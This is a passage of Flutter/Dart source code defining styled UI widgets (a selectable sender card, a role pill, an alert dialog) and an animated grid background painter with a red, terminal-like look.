                  fontSize: 12, letterSpacing: 0.5)),
        ]),
      ),
    ));
  }
}

class _SenderCard extends StatelessWidget {
  final String label;
  final int count;
  final bool selected;
  final VoidCallback onTap;
  const _SenderCard({required this.label, required this.count,
      required this.selected, required this.onTap});

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTap: onTap,
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 220),
        padding: const EdgeInsets.symmetric(vertical: 16),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(14),
          color: selected ? _red.withValues(alpha: 0.08) : _surface,
          border: Border.all(
            color: selected ? _red.withValues(alpha: 0.5) : _rim,
            width: selected ? 1.5 : 1,
          ),
          boxShadow: selected
              ? [BoxShadow(
                  color: _red.withValues(alpha: 0.1), blurRadius: 12)]
              : null,
        ),
        child: Column(children: [
          if (selected)
            Container(
              width: 5, height: 5,
              margin: const EdgeInsets.only(bottom: 8),
              decoration: const BoxDecoration(
                  shape: BoxShape.circle, color: _red),
            ),
          Text(label,
              style: TextStyle(
                  color: selected ? _red : _ash,
                  fontFamily: 'ShareTechMono',
                  fontWeight: FontWeight.bold,
                  fontSize: 12.5, letterSpacing: 1)),
          const SizedBox(height: 5),
          Text('$count ACTIVE',
              style: TextStyle(
                  color: selected
                      ? _red.withValues(alpha: 0.6)
                      : _slate,
                  fontFamily: 'ShareTechMono',
                  fontSize: 10)),
        ]),
      ),
    );
  }
}

class _RolePill extends StatelessWidget {
  final String role;
  const _RolePill({required this.role});
  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(20),
        color: _red.withValues(alpha: 0.1),
        border: Border.all(color: _red.withValues(alpha: 0.35)),
      ),
      child: Row(mainAxisSize: MainAxisSize.min, children: [
        Container(width: 5, height: 5,
            decoration: const BoxDecoration(
                shape: BoxShape.circle, color: _red)),
        const SizedBox(width: 6),
        Text(role.toUpperCase(),
            style: const TextStyle(
                color: _red, fontFamily: 'Orbitron',
                fontSize: 9, fontWeight: FontWeight.w900,
                letterSpacing: 1.5)),
      ]),
    );
  }
}

class _AlertDialog extends StatelessWidget {
  final String title, body;
  const _AlertDialog({required this.title, required this.body});
  @override
  Widget build(BuildContext context) {
    return Dialog(
      backgroundColor: Colors.transparent,
      child: ClipRRect(
        borderRadius: BorderRadius.circular(24),
        child: BackdropFilter(
          filter: ImageFilter.blur(sigmaX: 20, sigmaY: 20),
          child: Container(
            padding: const EdgeInsets.all(24),
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(24),
              color: _plate.withValues(alpha: 0.95),
              border: Border.all(color: _red.withValues(alpha: 0.3), width: 1),
              boxShadow: [BoxShadow(
                  color: _red.withValues(alpha: 0.15), blurRadius: 30)],
            ),
            child: Column(mainAxisSize: MainAxisSize.min, children: [
              Container(
                padding: const EdgeInsets.all(14),
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: _red.withValues(alpha: 0.12),
                  border: Border.all(color: _red.withValues(alpha: 0.4)),
                ),
                child: const Icon(Icons.info_outline_rounded,
                    color: _red, size: 24),
              ),
              const SizedBox(height: 16),
              Text(title,
                  style: const TextStyle(
                      color: _red, fontFamily: 'Orbitron',
                      fontWeight: FontWeight.w900,
                      fontSize: 13, letterSpacing: 2)),
              const SizedBox(height: 10),
              Text(body,
                  textAlign: TextAlign.center,
                  style: const TextStyle(
                      color: _ash, fontFamily: 'ShareTechMono',
                      fontSize: 12.5, height: 1.5)),
              const SizedBox(height: 22),
              GestureDetector(
                onTap: () => Navigator.pop(context),
                child: Container(
                  width: double.infinity, height: 46,
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(14),
                    border: Border.all(color: _red.withValues(alpha: 0.4)),
                    color: _red.withValues(alpha: 0.1),
                  ),
                  alignment: Alignment.center,
                  child: const Text('CLOSE',
                      style: TextStyle(
                          color: _red, fontFamily: 'Orbitron',
                          fontWeight: FontWeight.w900,
                          fontSize: 12, letterSpacing: 2)),
                ),
              ),
            ]),
          ),
        ),
      ),
    );
  }
}

// ─────────────────────────────────────────────────────────────
//  BACKGROUND PAINTER
// ─────────────────────────────────────────────────────────────
class _BgPainter extends CustomPainter {
  final double t;
  const _BgPainter({required this.t});

  @override
  void paint(Canvas canvas, Size s) {
    canvas.drawRect(Offset.zero & s, Paint()..color = _void);

    canvas.drawRect(Offset.zero & s, Paint()
      ..shader = RadialGradient(
        colors: [_red.withValues(alpha: 0.06), Colors.transparent],
        center: const Alignment(-0.8, -0.6),
        radius: 0.9,
      ).createShader(Offset.zero & s));

    final gp = Paint()
      ..color = _red.withValues(alpha: 0.025)
      ..strokeWidth = 0.4;
    const gs = 28.0;
    for (double x = 0; x < s.width; x += gs) {
      canvas.drawLine(Offset(x, 0), Offset(x, s.height), gp);
    }
    for (double y = 0; y < s.height; y += gs) {
      canvas.drawLine(Offset(0, y), Offset(s.width, y), gp);
    }

    final sy = s.height * ((t * 0.35) % 1.0);
    canvas.drawLine(
      Offset(0, sy), Offset(s.width, sy),
      Paint()
        ..color = _red.withValues(alpha: 0.06)
        ..strokeWidth = 1
        ..maskFilter = const MaskFilter.blur(BlurStyle.normal, 2),
    );

    canvas.drawRect(Offset.zero & s, Paint()
      ..shader = RadialGradient(
        colors: [Colors.transparent, Colors.black.withValues(alpha: 0.5)],
        radius: 1.2,
      ).createShader(Offset.zero & s));
  }

  @override
  bool shouldRepaint(_BgPainter o) => o.t != t;
}
